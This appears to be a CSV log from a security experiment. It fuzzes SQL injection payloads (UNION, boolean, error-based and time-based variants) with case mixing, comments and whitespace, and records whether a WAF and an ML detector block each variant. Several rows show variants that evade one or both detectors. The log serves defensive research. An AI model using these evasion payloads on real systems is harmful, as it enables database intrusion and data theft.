Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
20,2024-12-16T18:36:08.470956,-8187'   )    )     )   or 1698  =  2823#,403,403,200,waf_correct_ml_incorrect,"-0x1ffb' /**/ )	   )     )   Or 9654 IN (9653,9654,9655)   LIKe   (SEleCt 1)#@;",2024-12-16T18:36:10.517748,403,403,both_correct,"-0x1ffb' /*#O;*/ )	  /**/)     )   or  OR
3553=3553 In ((seLECt 9653),9654,9655)   LIke   (SELeCt 1)#@;",2024-12-16T18:36:15.545965,403,403,both_correct,"-0x1ffb' /**/ )	 /**//*B;	N^*/)     )   OR  Or 3553 LIKE 7992 liKe 7992 in ((SELECt 9653), AND (SELECT 1),9655)   lIKe   (select 1)#@;",2024-12-16T18:36:21.528659,403,403,both_correct,"-0x1ffb'   )	 /*j*//*B;
N^*/)     )   ||  OR 1176!=(sElecT 1177) LiKE 7992 LIKE 7992 IN ((seLECT 9653), and (SELEct 1), AND 1)   Like   (SELeCT 1)#@;",2024-12-16T18:36:28.911608,403,200,waf_correct_ml_incorrect,"-0x1ffb'   )
  /*B;
N^*/)     )    OR   oR 1176!=(SElecT 1177) likE  aNd 1 like 2112 IN (2111,2112,2113) In ((SeLect (SELECT 9653)), ANd (sELeCT 1), anD 1)   lIKE   (SelecT 1)#@;N",2024-12-16T18:36:36.940126,403,403,both_correct
21,2024-12-16T18:36:46.717559,"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi",403,403,200,waf_correct_ml_incorrect,"(seLect  OR 0)'   )    ) 	   )   or 'B[' LIKE 'B['  =/**/   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi",2024-12-16T18:36:54.724176,403,200,waf_correct_ml_incorrect,"(selECt  OR  OR 't'!='te')'   )    ) 	   )   or 'B[' LIKE
'B['  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi",2024-12-16T18:37:04.860532,403,200,waf_correct_ml_incorrect,"(sELEct  or  OR 't' not like 'te')'   )    )     )   or 'B[' LIKE
'B['  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (   /**/(     (  'ewwi'  =  'ewwi",2024-12-16T18:37:15.911472,403,403,both_correct,"(SeLeCt  OR  Or 't' not like 'te')'   )    )     )   or 'B[' LIKE	'B['  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi",2024-12-16T18:37:27.101702,403,403,both_correct,"(SElEct  oR  OR 't' not like 'te')'   )    )     )   or 'B[' LIKE	'B['  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    ( 	   (  'ewwi'  = /*""*/'ewwi",2024-12-16T18:37:38.487790,403,403,both_correct
22,2024-12-16T18:37:49.761950,389,200,200,200,both_correct,(SelEcT/**/0x1),2024-12-16T18:37:50.040813,403,200,waf_incorrect_ml_correct,(seLECt 0x1),2024-12-16T18:37:51.863063,403,200,waf_incorrect_ml_correct,"(SeLeCt
0x1)",2024-12-16T18:37:53.567885,403,403,both_incorrect,(SeLeCt 0x1),2024-12-16T18:37:55.257682,403,403,both_incorrect,(SelECt	0x1),2024-12-16T18:37:56.948915,403,403,both_incorrect
23,2024-12-16T18:37:58.645317,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",403,403,403,both_correct,"-2190' 
)   WhEre 8890 /**/ LIKE    AND 1 union all SeLECt '5'!='5G',0x22ba#",2024-12-16T18:38:01.706671,403,403,both_correct,"- AND 1 liKe 2296'  )   WhEre 8890   LIKE    AND 0x1 union all SeLECt '5'!='5G',0x22ba#",2024-12-16T18:38:06.425679,403,403,both_correct,"-/**/&& 'KB' NOT LIKE 'KBj' Like (SELECt 1)'  )   WhEre 8890   LIKE    AND 0x1
union all SeLECt '(SELECT 5)'!='5G',0x22ba#t",2024-12-16T18:38:11.647645,403,403,both_correct,"-/**/&& 'KB' NOT LIKE/**/'KBj' lIke (sELECt 1)'  )   WhEre 'Fa' NOT LIKE 'Fa,'   LIKE    AND 0x1	union all SeLECt '(sElEcT (SELECT  and 1))'!='5G',0x22ba#tHr",2024-12-16T18:38:18.509657,403,403,both_correct,"-/**/&& 'KB' not like/**/'KBj' lIKE (seLecT  AND 4819 LIKE 4819)'  )   WhEre 'Fa' NOT LIKE 'Fa,'  	LIKE    AND 0x1	union all SeLECt '(seLECt (SeLeCt /**/AND (SELECT 1)))'!='5G',0x22ba#tHr.",2024-12-16T18:38:26.893641,403,403,both_correct
24,2024-12-16T18:38:36.898990,"1""  )   where 3826  =  3826",403,200,200,both_incorrect,"1""  )	 /**/whEre (SELECT 3141)!= || 0  =  3826",2024-12-16T18:38:38.244978,200,403,waf_incorrect_ml_correct,"0x1""  )
  wHerE (SeLECt 3141)!= ||  && 1=7600  =  3826",2024-12-16T18:38:41.433322,200,200,both_incorrect,"0x1""  )
  wHERE (SeLect (SELECT '^ ' NOT LIKE '^ e'))!= || 
&& 1/**/like 7600  =  0xef2",2024-12-16T18:38:45.073639,403,403,both_correct,"0x1""  )
  whErE (SeLecT (selECT '^ ' NOT LIKE '^ e'))!=  OR  
&&
(SELECT 8991) LIke 8991 LiKe  OR 0  =  0xef2",2024-12-16T18:38:50.259649,403,403,both_correct,"0x1""  )   WHerE (SeleCt (selEcT/**/'^ ' NOT LIKE '^ e'))!=  oR  
&&
(seLeCT 4826!=(SELECT 1)) LIkE 0x231f like  OR 0   like   0xef2",2024-12-16T18:38:56.659083,403,403,both_correct
25,2024-12-16T18:39:03.911506,ubaldino,200,200,200,both_correct,ubaldino,2024-12-16T18:39:04.419958,200,200,both_correct,ubaldino,2024-12-16T18:39:05.899780,200,200,both_correct,ubaldino,2024-12-16T18:39:07.371248,200,200,both_correct,ubaldino,2024-12-16T18:39:08.892976,200,200,both_correct,ubaldino,2024-12-16T18:39:10.429587,200,200,both_correct
26,2024-12-16T18:39:11.921255,"1""  )   and elt  (  1889  =  7397,7397  )   and   (  ""kuau""  =  ""kuau",403,403,200,waf_correct_ml_incorrect," && 1""  )/**/  and elt  (  1889  =  7049<>7050,0x1ce5	 )   and   (  ""kuau""  =  ""kuau",2024-12-16T18:39:15.258560,403,200,waf_correct_ml_incorrect,"  AND  'rcr' NOT LIKE 'rcr#'""  )   and elt  (  (SELECT 1) 
=  7049<>0x1b8a,0x1ce5	 )   and   (  ""kuau""  =  ""kuau",2024-12-16T18:39:20.270533,403,403,both_correct,"  And  'rcr' not like 'rcr#'""  )   and elt  (  (SELECT '=' LIKE '=') 
=  /**/OR (SELECT 0)<>0x1b8a,0x1ce5	 )  	and   (  ""kuau""  =  ""kuau,",2024-12-16T18:39:26.474707,403,403,both_correct,"  and  'rcr' not like 'rcr#'""  )   and elt  (  (SELECT '=' LIKE '=') 
=  /**/OR (SELECT (SELECT 'pFz' LIKE 'pFz'))<>0x1b8a,0x1ce5  ) /**/	and   (  ""kuau""  =  ""kuau,:",2024-12-16T18:39:34.136323,403,403,both_correct,"  and  'rcr' not	like 'rcr#'""  )  /**/and elt  (  (SELECT '=' LIKE '=') 
=  /**/OR (SELECT (SELECT  OR (SELECT 1359)!=1360))<>0x1b8a,0x1ce5  ) /**/	and   (  ""kuau""  =  ""kuau,:(",2024-12-16T18:39:42.796946,403,403,both_correct
27,2024-12-16T18:39:51.945730,22468230j,200,200,200,both_correct,22468230j,2024-12-16T18:39:52.476065,200,200,both_correct,22468230j,2024-12-16T18:39:54.199419,200,200,both_correct,22468230j,2024-12-16T18:39:55.817668,200,200,both_correct,22468230j,2024-12-16T18:39:57.391086,200,200,both_correct,22468230j,2024-12-16T18:39:58.956420,200,200,both_correct
28,2024-12-16T18:40:00.492321,[email],200,200,200,both_correct,[email],2024-12-16T18:40:01.848791,200,200,both_correct,[email],2024-12-16T18:40:04.163341,200,200,both_correct,[email],2024-12-16T18:40:06.533239,200,200,both_correct,[email],2024-12-16T18:40:08.850562,200,200,both_correct,[email],2024-12-16T18:40:11.144430,200,200,both_correct
29,2024-12-16T18:40:13.475466,1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'opyp'  =  'opyp,403,403,200,waf_correct_ml_incorrect,1'   )    )    and 3754/**/ =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )	 ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  0x4bc= OR 0   )    )     )   from dual  )   and    (    (   'opyp'  =  'opyp,2024-12-16T18:40:34.287439,403,200,waf_correct_ml_incorrect,1'   )    )    and 3754/*BiY[*/ =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 3224!=3225 end  )   from dual  )  ||chr  (  (SELECT 1)  )  ||chr  (  122  )  ||chr  (  (SELECT 118)  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  0x4bc= OR 0   )    )     )   from dual  )   and   /**/(    (   'opyp'  =  'opyp,2024-12-16T18:40:56.502853,403,200,waf_correct_ml_incorrect,"1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (   OR 0x0  )  ||chr  (  537 IN (536,537,538)  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 3224!=3225 end  )   from dual  )  ||chr  (  (SELECT 1)  )  ||chr  (  122  )  ||chr  (  (SELECT 118) 	)  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  0x4bc= OR 0   )    )     )   from dual  )   and   /**/(    (   'opyp'  =  'opyp",2024-12-16T18:41:20.276911,403,200,waf_correct_ml_incorrect,"1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (   OR 0x0  )  ||chr  (  537 IN (536,0x219,538)  )  ||  (  select   (  case when   (  3754  =  3754  )   then 5016 IN (5015,5016,5017) else (SELECT 1)!=3225 end  )   from dual  )  ||chr  (  (SELECT 1)  )  ||chr  (  122  )  ||chr  (  (SELECT 118) 
)  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  0x4bc= OR 0   )    )     )   from dual  )   and    (    (   'opyp'  =  'opyp",2024-12-16T18:41:44.890563,403,200,waf_correct_ml_incorrect,"1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  0x70  )  ||chr  (   OR 0x0  )  ||chr  (  537 IN (536,0x219, OR 0)  )  ||  (  select   (  case when   (  3754  =  3754  )   then 5016 IN (5015,5016,5017) else (SELECT 1)!=3225 end  )   from dual  )  ||chr  (  (SELECT 1)  )  ||chr  (  122  )  ||chr  (  (SELECT 118) 
)  ||chr  (  3457 NOT LIKE 3458  )  ||chr  (  113/**/ )  ||chr  (  0x4bc= OR 0   )    )     )   from dual  )   and    (  	 (   'opyp'  =  'opyp",2024-12-16T18:42:10.639424,403,200,waf_correct_ml_incorrect
30,2024-12-16T18:42:37.293133,"-7806""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""vlrj"" like ""vlrj",403,403,200,waf_correct_ml_incorrect,"-7806"" /*Fa""*/ )    )    or   (   OR 0  =  (SELECT 1074) IN (1073,1074,1075)  )  *4906 and    (    ( 	 ""vlrj"" like ""vlrj",2024-12-16T18:42:41.327056,403,403,both_correct,"-7806""   )    )    Or   (   oR 9355=9355  =  (seLECt (SELECT 1074)) in (1073,1074,1075)  )  * AND 1 AnD    (    ( 
 ""vlrj"" lIkE ""vlrj",2024-12-16T18:42:48.036986,403,403,both_correct,"-7806""   )    ) 
  Or  /**/(   oR 9355=9355  =  (seLECt (SELECT 1074)) in (1073,(SELECT 1)!=3040,(SELECT 1075))  )  * AND 1 AnD    (    ( 
 ""vlrj"" lIkE ""vlrj",2024-12-16T18:42:55.592232,403,403,both_correct,"-7806""   )    )/**/   Or  /* kv*/(   oR 9355=9355  =  (seLECt (SELECT 1074)) in ( AND 1,(SELECT 1)!='@'<>'@k',(SELECT (SELECT 1075)))  )  * AND 1 AnD    (    ( 
 ""vlrj"" lIkE ""vlrj",2024-12-16T18:43:03.997932,403,403,both_correct,"- AND 1""   )    )/*@|*/   Or  /* kv*/(   oR 0x248b=9355  =  (seLECt (SELECT 1074)) in ( AND 6505 IN (6504,6505,6506),(SELECT 1)!='@'<>'@k',(SELECT (SELECT 1075)))  )  * AND 1 AnD    (    (   ""vlrj"" lIkE/**/""vlrj",2024-12-16T18:43:13.419024,403,403,both_correct
31,2024-12-16T18:43:24.560177,"1""   )    )    as exzo where 7518  =  7518   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",403,403,200,waf_correct_ml_incorrect,"0x1""   ) /**/  )    AS exzo WHeRE 7518  =  7518   (  sEleCt   (  caSE WHEN   (  4587  = 
4587  )   tHen regexp_substring  (  repeat  (  lEfT  (  crypt_key  (  char  (  65  )  ||char  (  (SELECT 1)  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   ElSE char  (  76  )  ||char  (  807=807  )  ||char  (  102  )   or char  (  72  )   End  )   fRoM   (  values  (  0   )    )     )  --",2024-12-16T18:43:42.345413,403,200,waf_correct_ml_incorrect,"0x1""   ) /**/  )    aS exzo WHEre 7518   lIKe   7518   (  selEcT   (  Case wHen   (  4587  =  4587  )   ThEN regexp_substring  (  repeat  (  LEft  (  crypt_key  (  char  (  0x41  )  ||char  (  (SELecT 1)  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  ) /**/ Else char  (  76  )  ||char  (  807='DzvA' LiKe 'DzvA'  )  ||char  (  102  )   OR char  (   OR 0  )   end  )   fROm   (  values  (  0   )    )     )  --",2024-12-16T18:44:01.922781,403,200,waf_correct_ml_incorrect,"0x1""   ) /**/  )    as exzo wHEre 7518   lIkE   7518   (  sELEcT   ( /**/caSe wHeN   (  4587  =  4587  )   THeN regexp_substring  (  repeat  (  lEft  (  crypt_key  (  char  (  0x41  )  ||char  (  (seLECt 1)  )   Or char  (  0x53  )  ,null  )  ,0  )  ,500000000  ) 
,null  ) /*	ZF*/ eLSE char  (  76  )  ||char  (  807='DzvA' LIkE 'DzvA'  )  ||char  (  102  )   OR char  (   OR  or 7542!=7543  )   End  )   fRom   (  values  (  0   )    )     )  --",2024-12-16T18:44:22.683577,403,200,waf_correct_ml_incorrect,"0x1""   ) /**/  )    AS exzo wHeRe (SELect 7518)   likE   7518   (  SeLeCt   (  casE WHen   (  4587  =  4587  )   then regexp_substring  (  repeat  (  lEft  (  crypt_key  (  char  (  0x41  )  ||char  (  (SElECT 1)  )   oR char  (  0x53  )  ,null  )  ,0  )  , AnD 1  ) 	,null  ) /**/ eLSe char  (  76  )  ||char  (  807='DzvA' liKE 'DzvA'  )   OR char  (  102  )   or char  (   OR  oR '4Od'='4Od'!=7543  )   end  )   fROM   (  values  (  0   )    )     )  --",2024-12-16T18:44:44.725579,403,200,waf_correct_ml_incorrect,"0x1""   ) /**/  )    aS exzo whERe (SeLEcT 7518)   LIKe    OR 0   (  sElECt   (  case wHEn   (  4587  =  4587  )   tHEn regexp_substring  (  repeat  (  LEFT  (  crypt_key  (  char  (  0x41  )  ||char  (  (sELEcT 1)  )   Or char  (  0x53  )  ,null  )  ,0  )  , aNd 1  ) 	,null  )   elSe char  (  76  )  ||char  (  3821 In (3820,3821,3822)='DzvA' LIkE 'DzvA'  )   or char  (  0x66  )   or char  (   OR  OR '4Od' like '4Od'!=7543  )   EnD  )   FROm   (  values  (  0   )    ) 
   )  --",2024-12-16T18:45:07.207602,403,200,waf_correct_ml_incorrect
32,2024-12-16T18:45:30.853149,[email],200,200,200,both_correct,[email],2024-12-16T18:45:32.223346,200,200,both_correct,[email],2024-12-16T18:45:34.626632,200,200,both_correct,[email],2024-12-16T18:45:36.993547,200,200,both_correct,[email],2024-12-16T18:45:39.522955,200,200,both_correct,[email],2024-12-16T18:45:41.989977,200,200,both_correct
33,2024-12-16T18:45:44.356071,"select * from generate_series  (  9167,9167,case when   (  9167  =  2273  )   then 1 else 0 end  )   limit 1--",403,200,403,waf_incorrect_ml_correct,"sELecT * From generate_series  (  9167,9167,CASE when	  (  (SeLeCT 9167)   Like   2273  )   tHeN '>_s'<>'>_sF' ELSE/**/ ANd 1 eND  )   limit 1--",2024-12-16T18:45:49.596761,200,403,waf_incorrect_ml_correct,"SeLeCt * FROM generate_series  (  9167,9167,caSe	whEN	  (  (seLecT  AND 1)   LIke   2273  )   THen '>_s' not like '>_sF' elSE  AnD 0x1 eND  )   limit 1720!=1721--",2024-12-16T18:45:57.418321,200,403,waf_incorrect_ml_correct,"Select * FRom generate_series  ( /**/9167,9167,CAsE whEn	  (  (seLeCT  AND 'et2' NOT LIKE 'et2|')   LIKe    && 1  )   thEN '>_s' not like '>_sF' ElsE  AnD 0x1 ENd  )   limit (SELECT 1720)!=1721--",2024-12-16T18:46:06.030012,200,403,waf_incorrect_ml_correct,"SelECT * fROm generate_series  (
 0x23cf,9167,CASE whEn	  (  (SeLecT  AND 'et2' not like 'et2|')   liKE    && 9362<>9363  )   thEN '>_s' not like '>_sF' eLSe  AND 0x1 eND  )   limit (SElecT (Select 1))!=1721--",2024-12-16T18:46:16.474863,200,403,waf_incorrect_ml_correct,"seLeCt * FROm generate_series  (
 0x23cf, anD 1,CaSe wHeN	  (  (sElECt  ANd 'et2' not like 'et2|')   likE    && 0x2492!=9363  )   Then '>_s' not like '>_sF' eLse  and 0x1 End/**/ ) 	 limit (SElECt (SeLecT 1))!='B='<>'B=8'--",2024-12-16T18:46:27.242240,200,200,both_incorrect
34,2024-12-16T18:46:38.965932,antih sacido,200,200,200,both_correct,"antih/*L{*x*/sacido",2024-12-16T18:46:39.655897,200,200,both_correct,"antih/*L{*x*/sacido",2024-12-16T18:46:41.649471,200,200,both_correct,"antih/*L{*x*/sacido",2024-12-16T18:46:43.681552,200,200,both_correct,"antih/*L{*x*/sacido",2024-12-16T18:46:45.726473,200,200,both_correct,"antih/*L{*x*/sacido",2024-12-16T18:46:47.777130,200,200,both_correct
